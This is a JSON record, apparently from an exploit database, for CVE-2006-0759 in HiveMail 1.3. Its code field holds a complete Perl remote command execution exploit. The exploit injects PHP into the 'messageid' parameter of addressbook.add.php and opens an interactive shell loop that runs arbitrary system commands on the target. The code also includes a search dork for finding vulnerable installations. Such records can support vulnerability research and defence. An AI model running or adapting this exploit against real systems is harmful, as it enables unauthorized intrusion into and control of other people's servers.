{
  "id": "1756",
  "title": "HiveMail 1.3 - &#039;addressbook.add.php&#039; Remote Code Execution",
  "cve": "CVE-2006-0759",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl                                     #\r\n#                                                   #\r\n# HiveMail <= 1.3 remote command execution exploit  #\r\n#                                                   #\r\n#################################################################################\r\n#                                                                               #\r\n# Advisory:                                                                     #\r\n# http://www.gulftech.org/?node=research&article_id=00098-02102006              #\r\n#                                                                               #\r\n# To get the hivesession:                                                       #\r\n# log on hivemail with firefox then look at the hivesession number in the url.  #\r\n# (yes i know...)                                                               #\r\n#                                                                               #\r\n#################################################################################\r\n#                                                                      #\r\n# Dork:                                                                #\r\n# \"Already have an account?\" \"Enter your information below to log in.\" #\r\n#                                                                      #\r\n########################################################################\r\n#               #\r\n# coded by [Oo] #\r\n#               #\r\n#################\r\n\r\n\r\nrequire LWP::UserAgent;\r\nuse URI;\r\nuse Getopt::Long;\r\n\r\n$| = 1;  # fflush stdout after print\r\n\r\n# Default options\r\n# connection \r\nmy $basic_auth_user = '';\r\nmy $basic_auth_pass = '';\r\nmy $proxy = '';\r\nmy $proxy_user = '';\r\nmy $proxy_pass = '';\r\nmy $conn_timeout = 15;\r\n\r\n# general\r\nmy $host;\r\nmy $session;\r\n \r\n print \"\\n[i] HiveMail <= 1.3 remote command execution exploit\\n\";\r\n print \"[i] coded by [Oo]\\n\";\r\n \r\n\r\n # read command line options\r\n my $options = GetOptions (\r\n\r\n #general options\r\n 'host=s'    => \\$host, # input host to test.\r\n 'session=s'    => \\$session, # input host to test.\r\n # connection options\r\n 'basic_auth_user=s' => \\$basic_auth_user,\r\n 'basic_auth_pass=s' => \\$basic_auth_pass,\r\n 'proxy=s'           => \\$proxy,\r\n 'proxy_user=s'      => \\$proxy_user,\r\n 'proxy_pass=s'      => \\$proxy_pass,\r\n 'timeout=i'         => \\$conn_timeout);\r\n \r\n # command line sanity check \r\n &show_usage unless ($host);\r\n &show_usage unless ($session);\r\n \r\n # main loop \r\n while (1){\r\n \tprint \"\\n[hivemail] \";\r\n \tmy $cmd = <STDIN>;\r\n \thm_xploit ($cmd);\r\n }\r\n\r\n exit (1);\r\n\r\n#exploit \r\nsub hm_xploit {\r\n  chomp (my $data = shift);\r\n  \r\n  if ($data eq \"exit\") { print \"\\n[e] Exit!\\n\";exit(); }\r\n\r\n  my $exp = $host.\"addressbook.add.php?hivesession=\".$session.\"&cmd=quick&messageid=\\\");echo%20\\\"start_er\\\";system(\\$com);echo%20\\\"end_er\\\";\\@d(\\\"&popid=1&com=\".$data.\" \";\r\n  my $req = new HTTP::Request 'GET' => $exp;\r\n \r\n  \r\n  my $ua = new LWP::UserAgent;\r\n  $ua->timeout($conn_timeout);\r\n\r\n  if ($basic_auth_user){\r\n    $req->authorization_basic($basic_auth_user, $basic_auth_pass) \r\n  }\r\n  if ($proxy){\r\n    $ua->proxy(['http'] => $proxy);\r\n    $req->proxy_authorization_basic($proxy_user, $proxy_pass);\r\n  }\r\n\r\n\t \r\n  my $res = $ua->request($req);\r\n  my $show = $res->content;\r\n  \r\n  print\"\\n\";\r\n  if ($show =~ m/start_er(.*?)end_er/ms) {\r\n    my $out = $1;\r\n    $out =~ s/^\\s+|\\s+$//gs;\r\n    if ($out) {\r\n      print \"$out\\n\";\r\n    }\r\n  }\r\n  \r\n}\r\n\r\n# show options \r\nsub show_usage {\r\n  print \"\\n[*] Usage: ./hmail_exp.pl [options] [host] [session]\\n\";\r\n  print \"[*] Options:\\n\";\r\n  print \"\\t--proxy (http), --proxy_user, --proxy_pass\\n\";\r\n  print \"\\t--basic_auth_user, --basic_auth_pass\\n\";\r\n  print \"\\t--timeout \\n\";\r\n  print \"[*] Example:\\n\";\r\n  print \"    hmail_exp.pl --host=http://127.0.0.1/hivemail/ --session=22ead72ecf6af376a801923466a23efa\\n\";\r\n  exit(1);\r\n}\r\n\r\n# milw0rm.com [2006-05-06]",
  "url": "https://www.exploit-db.com/exploits/1756"
}